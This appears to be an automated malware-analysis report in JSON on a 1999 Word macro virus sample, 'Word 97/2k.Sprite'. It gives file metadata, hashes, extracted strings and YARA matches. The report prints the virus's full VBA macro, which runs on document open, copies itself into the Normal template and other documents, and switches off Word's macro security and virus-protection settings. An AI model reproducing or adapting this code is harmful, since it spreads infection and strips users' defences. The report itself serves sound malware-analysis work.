{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Call": "May call a DLL using Excel 4 Macros",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "'\nPrivate Sub Document_Open()\n On Error Resume Next\n Dim norm As Variant, code(21) As String\n Dim doc As Variant, bug As Variant\n norm = \"c\" & Int((Rnd * 1000) + 2)\n doc = \"d\" & Int((Rnd * 1000) + 2)\n bug = \"b\" & Int((Rnd * 1000) + 2)\n code(1) = \"Set \" & norm & \" = NormalTemplate.VBProject.VBComponents(1).CodeModule\"\n code(2) = \"Set \" & doc & \" = ActiveDocument.VBProject.VBComponents(1).CodeModule\"\n code(3) = \"Set \" & bug & \" = new dataobject\"\n code(4) = \"If \" & norm & \".lines(1, 1) <> \"\"'\"\" Then\"\n code(5) = \"With \" & norm\n code(6) = \".DeleteLines 1, .CountOfLines\"\n code(7) = \"End With\"\n code(8) = bug & \".SetText \" & doc & \".lines(1, \" & doc & \".CountOfLines): \" & norm & \".InsertLines 1, \" & bug & \".GetText(1)\"\n code(9) = \"End If\"\n code(10) = \"If \" & doc & \".lines(1, 1) <> \"\"'\"\" Then\"\n code(11) = \"With \" & doc\n code(12) = \".DeleteLines 1, .CountOfLines\"\n code(13) = \"End With\"\n code(14) = bug & \".SetText \" & norm & \".lines(1, \" & norm & \".CountOfLines): \" & doc & \".InsertLines 1, \" & bug & \".GetText(1)\"\n code(15) = \"End if\"\n code(16) = \"\" & norm & \".DeleteLines 34, 21\"\n code(17) = \"\" & doc & \".DeleteLines 34, 21\"\n code(18) = \"If System.PrivateProfileString(\"\"\"\", \"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\"\", \"\"Level\"\") <> \"\"\"\" Then: CommandBars(\"\"Macro\"\").Controls(\"\"Security...\"\").Enabled = 0: System.PrivateProfileString(\"\"\"\", \"\"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\"\", \"\"Level\"\") = 1&\"\n code(19) = \"Options.ConfirmConversions = 0: Options.SaveNormalPrompt = 0: Options.VirusProtection = 0\"\n code(20) = \"ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument\"\n For x = 1 To 20: codevx = codevx & code(x) & vbCr: Next x\n  ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 34, codevx\n Call Sprite\nEnd Sub\nPrivate Sub Sprite(): On Error Resume Next\nEnd Sub\n' Word 97/2k.Sprite\n' Psyclone X\n' My first try at POLYMORPHISM (If it could even be called that)\n' I know it sucks but it'll get better\n\n"
    },
    "filename": "VirusShare_367f55467c4727ba611e902704329a90",
    "filesize": 43008,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: Animation, Author: Stanley Campbell, Template: Normal, Last Saved By: c, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Wed Nov 24 09:41:00 1999, Last Saved Time/Date: Wed Nov 24 09:41:00 1999, Number of Pages: 1, Number of Words: 59, Number of Characters: 337, Security: 0",
    "hashes": {
        "md5": "367f55467c4727ba611e902704329a90",
        "sha1": "6a292dccffa07c0f4b9445cae923dbad8c183ebf",
        "sha256": "7ca8185062ce998b5221e9af90198de886aa0b7e4b549b8fb83a9cce30cffc55"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjt+t+",
            "Animation",
            "Also see Windows Archeticture for Developers Book, Lab 12 Page 68",
            "References:",
            "\tMicrosoft Windows Common Controls 5.0",
            "\tMicrosoft Windows Common Controls-2 5.0",
            "\tMicrosoft Common Dialog Control 5.0",
            "Components:",
            "\tAnimation Control",
            "\tCommon Dialog Control",
            "with CommonDialog1",
            "\t.Filter = avi (*.avi) | *.avi",
            "\t.ShowOpen",
            "End with",
            "with Animation1",
            "\t.AutoPlay = True",
            "\t.Open CommonDialog1.Filename",
            "End with",
            "/ =!",
            "@EPSON Stylus COLOR 600",
            "LPT1:",
            "EPS600",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "LPT1:",
            "EPSON Stylus COLOR 600",
            "EPSON Stylus COLOR 600",
            "LPT1:",
            ");f);f",
            "Animation",
            "Stanley Campbell",
            "Normal",
            "Microsoft Word 8.0",
            "Animation",
            "Title",
            "Animation",
            "_PID_GUID",
            "@cT6",
            "Set  ",
            " = NormalTemplate.VBProject.VBComponents(1).CodeModule",
            "Set  ",
            " = ActiveDocument.VBProject.VBComponents(1).CodeModule",
            "Set  ",
            " = new dataobject",
            ".lines(1, 1) <> \"'\" Then",
            "With ",
            ".DeleteLines 1, .CountOfLines",
            "End W",
            "D!7(])",
            "D!7(])",
            "4ith",
            ".SetText ",
            ".lines(1, ",
            ".CountOfLines): ",
            ".InsertLines 1, ",
            ".GetText(1)",
            "End If",
            ".lines(1, 1) <> \"'\" Then",
            "With ",
            ".DeleteLines 1, .CountOfLines",
            "End With",
            ".SetText ",
            ".lines(1, ",
            ".CountOfLines): ",
            ".InsertLines 1, ",
            ".GetText(1)",
            "End if",
            ".DeleteLines 34, 21",
            ".DeleteLines 34, 21",
            "If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") <> \"\" Then: CommandBars(\"Macro\").Controls(\"Security...\").Enabled = 0: System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&",
            "Options.ConfirmConversions = 0: Options.SaveNormalPrompt = 0: Options.VirusProtection = 0",
            "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument",
            " Word 97/2k.Sprite",
            " Psyclone X",
            " My first try at POLYMORPHISM (If it could even be called that)",
            " I know it sucks but it'll get better",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "v_Ope",
            " Error R",
            "es NextA",
            "Dim n",
            "As Varia",
            "nt, codeP(21)",
            "& Int((R",
            "nd * 1000) + 2",
            "Set ",
            "= sET.V",
            "BProject@",
            "Compon@s(1).C@;M`odule>)A",
            "Acte;",
            "new d@obA' ",
            "If5.li$ne",
            "-, =<>",
            " \"\"'\"\" T(hen",
            "Wi\\thF",
            ".DeleteLA",
            " 1, ?untOf",
            "..GT?@",
            "):%\".InsertF#",
            "9%If",
            "}V%1 ",
            "E%12",
            "%`G(1C;%1b8%T%",
            "%%1A!",
            "B34, 2~1+cA",
            "1System.C\u0112ofile",
            ",WHKEY",
            "_CURRENT",
            "_USER\\So",
            "\\Mic",
            "\\Off",
            "ice\\9.0\\",
            "Word\\Security\"\"A",
            "Level\"\")& aa: `|ma@ndBars",
            "]ntroFla",
            "...!",
            ".\\Opti",
            "onsA",
            "firmConversA",
            "Save",
            "`,mpt",
            "Virus",
            "g\tF5:=",
            "Full",
            "Ft:=<wd#",
            "1 To 2@",
            "x)A@vbCr: xpg?J1,",
            "Call Sp0#x0Subr=",
            "rqrF",
            "!( 97/2k.",
            "' Psycl",
            " e X",
            "st tr",
            "y at POL",
            "YMORPHISHM (1it",
            "ld +n be",
            "~that",
            "r' I kno",
            "sucksV ",
            "etter",
            "# *F",
            "l/ 5$",
            "# *F",
            "D/ 5$",
            "# *F",
            "4/ 5$",
            "T;/ 6",
            "T;/ 6",
            "T;/ 6",
            "l$:\t",
            "T;/ 6",
            "l$`# ",
            "T;/ 5$",
            "4p:`",
            "P`# ",
            "T;/ 6",
            "D$:\t",
            "T;/ 6",
            "D$`# ",
            "T;/ 5$",
            "4p:`",
            "P`# ",
            "T;/ 6",
            "T;/ 6",
            "T;/ 6",
            "QXH)",
            "xtp\\",
            "QX8)",
            "xtp\\",
            "]<5\\z",
            "]<5\\7",
            "t:`2",
            "xtp\\",
            "'L'\\'l'|'''''",
            "|l\\L",
            "4383bb2b7",
            "Wordk",
            "Win16~",
            "Win32",
            "Animation",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Document_Open",
            "normP>",
            "code",
            "bugz",
            "RndR",
            "codevx8",
            "vbCr",
            "VBProjectOh",
            "VBComponents",
            "CodeModule",
            "InsertLines",
            "Sprite",
            "c707:",
            "NormalTemplateq",
            "d535H",
            "ActiveDocument\\",
            "b581k",
            "DataObject",
            "lines",
            "DeleteLines",
            "CountOfLines!\\",
            "SetText",
            "GetText",
            "Systema",
            "PrivateProfileString[",
            "CommandBars",
            "ControlsK",
            "Enabled\u06ea",
            "Options",
            "ConfirmConversions",
            "SaveNormalPrompt\u02bc",
            "VirusProtectionoD",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "FileFormat",
            "wdFormatDocument",
            "_B_var_x",
            "_B_var_codevxb",
            "Itemz",
            "_B_var_c707",
            "_B_var_d535u[",
            "_B_var_b581",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F22D1",
            "58E2-976",
            "2-11D2-A",
            "BF8-A7E9",
            "D9CD9731",
            "3.TWD#M",
            "icrosoft ",
            "` Ob",
            " LibraryG",
            "PB5105803-A210",
            "BF9-FBB",
            "944D3213",
            "Pc:\\win dows\\JP\\VBE\\(EX(",
            "KCxN@UalCxNETax",
            "Offic",
            "DO@f",
            "G{2D",
            "F8D04C-5",
            "BFA-101B -BDE5@AA",
            "fPRO",
            "GRAM FIL",
            "ES\\MICRO",
            "SOFT OFF",
            "ICE\\",
            "MSO97.DLLHk#P 8.0k",
            "hisDocum",
            "h@6s",
            "*\\CNormalrU",
            "ThisDocument",
            "Project",
            "C:\\PROGR_",
            "AM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\StdOle2.tlb",
            "stdole",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "c:\\windows\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "Document",
            "Document_Open",
            "Sprite",
            "VBA332.DLL",
            "Set ",
            " = NormalTemplate.VBProject.VBComponents(1).CodeModule",
            " = ActiveDocument.VBProject.VBComponents(1).CodeModule",
            " = new dataobject",
            ".lines(1, 1) <> \"'\" Then",
            "lines",
            "With ",
            ".DeleteLines 1, .CountOfLines",
            "End With",
            ".SetText ",
            ".lines(1, ",
            ".CountOfLines): ",
            ".InsertLines 1, ",
            ".GetText(1)",
            "End If",
            "End if",
            ".DeleteLines 34, 21",
            "If System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") <> \"\" Then: CommandBars(\"Macro\").Controls(\"Security...\").Enabled = 0: System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&.",
            "Options.ConfirmConversions = 0: Options.SaveNormalPrompt = 0: Options.VirusProtection = 0,",
            "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument",
            "CountOfLines",
            "DeleteLines",
            "SetText",
            "GetText",
            "InsertLines",
            "Level ",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Security...",
            "Macro",
            "ThisDocument",
            "ID=\"{B2822025-A21D-11D3-ABF9-FBB944D32137}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"181ADDDBE1DBE1DBE1DBE1\"",
            "DPB=\"3032F5F6F6F6F6F6\"",
            "GC=\"494B8C118D118DEE\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "\t.Filter = avi (*.avi) | *.avi": "Video",
            "AM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.301442",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
